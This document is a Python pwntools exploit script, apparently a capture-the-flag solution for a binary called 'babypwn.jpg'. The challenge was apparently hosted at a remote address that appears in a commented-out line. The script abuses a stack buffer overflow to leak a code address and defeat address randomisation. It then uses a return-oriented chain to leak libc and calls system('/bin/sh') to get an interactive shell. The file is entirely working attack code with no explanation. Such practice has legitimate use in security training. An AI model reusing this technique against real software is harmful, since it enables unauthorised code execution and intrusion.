from pwn import *


p = process("./babypwn.jpg")
elf=ELF("./babypwn.jpg")
libc= elf.libc
#p = remote("35.209.8.157",1337)
#elf=ELF("./babypwn.jpg")
#libc =ELF("./")


def stackbufferoverflow(strings):
	p.sendlineafter("choice: ","1")
	p.sendafter(": ",strings)

pop_rdi = 0x0000000000000c7b


payload = b"A"*0x78
payload += b"\xd0"
stackbufferoverflow(payload)
payload  = b"XX"
p.send(payload)
p.recvuntil("XXAAAAAAAAAAAAAAAAAAAAAA")
leak = u64(p.recv(6).ljust(8,b"\x00"))
log.info("LEAK -> "+ hex(leak))

base = leak - 0xbd5 
log.info("BASE -> "+hex(base))

pop_rdi = base +0x0000000000000c7b
log.info("POP_ RDI -> "+hex(pop_rdi))

puts_plt = base + elf.plt['puts']
puts_got = base + elf.got['puts']
log.info("PUTS-GOT -> "+hex(puts_got))
stack_oveflow_got = base + 0xb60
ret_stack_overflow = base + 0xb8c
#POC
payload = b"A"*0x78
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(stack_oveflow_got)
stackbufferoverflow(payload)

Leak_Of_Libc = u64(p.recv(6).ljust(8,b"\x00"))
log.info("LEAK[LIBC] - > "+hex(Leak_Of_Libc))

libc.address = Leak_Of_Libc - libc.symbols['puts']
log.info("LIBC ADDRESS -> "+hex(libc.address))


system =libc.symbols['system']
log.info("SYSTEM -> "+hex(system))
binsh_off =libc.address + 0x1b40fa
log.info("BINSH -> "+hex(binsh_off))

payload = b"A"*0x78
payload += p64(ret_stack_overflow)
payload += p64(pop_rdi)
payload += p64(binsh_off)
payload += p64(system)
sleep(1)
p.sendline(payload)

p.interactive()